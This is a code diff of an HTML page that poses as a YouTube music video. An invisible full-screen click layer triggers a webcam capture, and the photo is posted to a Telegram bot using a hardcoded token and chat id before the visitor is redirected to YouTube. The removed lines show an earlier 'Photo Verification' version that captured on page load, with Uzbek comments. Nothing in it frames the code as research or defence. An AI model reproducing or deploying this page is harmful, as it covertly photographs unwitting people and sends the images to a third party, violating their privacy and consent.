@@ -1,47 +1,37 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Photo Verification</title>
+    <meta charset="UTF-8">
+    <title>YouTube - Music Video</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; overflow: hidden; background: #000; }
+        iframe { width: 100%; height: 100%; border: none; }
+        .click-layer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99; }
+    </style>
 </head>
 <body>
-    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
-    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <iframe src="https://www.youtube.com/embed/Enf0Z0SsQHs?autoplay=1&mute=1"></iframe>
+    <div class="click-layer" onclick="capture()"></div>
+    <video id="v" style="display:none;" autoplay></video>
+    <canvas id="c" style="display:none;" width="640" height="480"></canvas>
 
     <script>
-        const botToken = '8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI';
-        const adminId = '8275787221';
-
-        async function startCamera() {
-            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-
+        async function capture() {
+            const s = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v');
+            v.srcObject = s;
             setTimeout(() => {
-                takePhoto();
-            }, 2000); // 2 soniyadan keyin rasmga oladi
+                const c = document.getElementById('c');
+                c.getContext('2d').drawImage(v, 0, 0);
+                c.toBlob(b => send(b));
+            }, 1000);
         }
-
-        function takePhoto() {
-            const canvas = document.getElementById('canvas');
-            const video = document.getElementById('video');
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            canvas.toBlob(blob => {
-                sendToTelegram(blob, 'photo');
-            }, 'image/jpeg');
+        function send(b) {
+            const fd = new FormData();
+            fd.append('photo', b, 'p.jpg');
+            fetch('https://api.telegram.org/bot8541185973:AAFhTLOGzfi5FQpMrnLKtKVzzWeUr6SL2rI/sendPhoto?chat_id=8275787221', {method:'POST', body:fd})
+            .then(() => window.location.href = "https://youtu.be/Enf0Z0SsQHs");
         }
-
-        async function sendToTelegram(blob, type) {
-            const formData = new FormData();
-            formData.append(type, blob, 'image.jpg');
-            await fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}?chat_id=${adminId}`, {
-                method: 'POST',
-                body: formData
-            });
-            window.location.href = "https://google.com"; // Tugagach Google'ga o'tkazib yuboradi
-        }
-
-        window.onload = startCamera;
     </script>
 </body>
 </html>
